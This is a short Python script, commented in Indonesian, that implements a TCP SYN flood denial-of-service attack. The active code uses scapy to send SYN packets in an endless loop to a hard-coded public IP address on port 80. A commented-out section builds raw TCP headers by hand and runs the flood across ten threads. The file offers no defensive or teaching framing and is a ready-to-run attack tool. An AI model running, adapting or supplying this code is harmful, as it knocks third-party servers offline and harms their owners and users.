#!/usr/bin/env python
from src.header import Header
from src.argument_handler import *
from src.helpers import *
from scapy.all import IP, TCP, send

# if __name__ == "__main__":
#     clear_terminal()
#     header = Header()
#     ArgumentHandler()

TARGET_IP = "103.139.25.17"  # IP server target (ubah sesuai kebutuhan)
TARGET_PORT = 80          # Port target (contoh HTTP)

def tcp_flood():
    """Mengirimkan banyak paket TCP SYN"""
    while True:
        ip_layer = IP(dst=TARGET_IP)  # Layer IP
        tcp_layer = TCP(dport=TARGET_PORT, flags="S")  # SYN Flag
        packet = ip_layer / tcp_layer
        send(packet, verbose=0)  # Kirim paket

if __name__ == "__main__":
    tcp_flood()

# def create_tcp_packet():
#     """Membuat paket TCP mentah"""
#     # Header TCP sederhana
#     source_port = random.randint(1024, 65535)  # Random source port
#     seq_number = random.randint(0, 4294967295)  # Random sequence number
#     ack_number = 0  # No acknowledgment in SYN
#     offset_reserved_flags = (5 << 4) | 2  # Data offset dan SYN flag
#     window = socket.htons(5840)  # Window size
#     checksum = 0  # Checksum akan dihitung oleh OS
#     urgent_pointer = 0

#     tcp_header = struct.pack(
#         '!HHLLBBHHH', 
#         source_port, 
#         TARGET_PORT, 
#         seq_number, 
#         ack_number, 
#         offset_reserved_flags, 
#         0,  # Reserved
#         window, 
#         checksum, 
#         urgent_pointer
#     )

#     return tcp_header

# def tcp_flood():
#     i = 0
#     """Fungsi untuk menyerang target dengan TCP Flood"""
#     while True:
#         try:
#             sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
#             sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)  # Sertakan header IP

#             # Membuat paket TCP
#             packet = create_tcp_packet()
            
#             # Mengirimkan paket ke target
#             sock.sendto(packet, (TARGET_IP, TARGET_PORT))
#             i += 1
#             print(f"{i}. Packet sent to", TARGET_IP, "on port", TARGET_PORT)
#         except Exception as e:
#             print(f"{i}. Error: {e}")

# # Menjalankan beberapa thread untuk serangan simultan
# def start_attack(thread_count):
#     threads = []
#     for _ in range(thread_count):
#         thread = threading.Thread(target=tcp_flood)
#         threads.append(thread)
#         thread.start()

#     for thread in threads:
#         thread.join()

# if __name__ == "__main__":
#     thread_count = 10  # Jumlah thread (sesuaikan dengan kapasitas Anda)
#     start_attack(thread_count)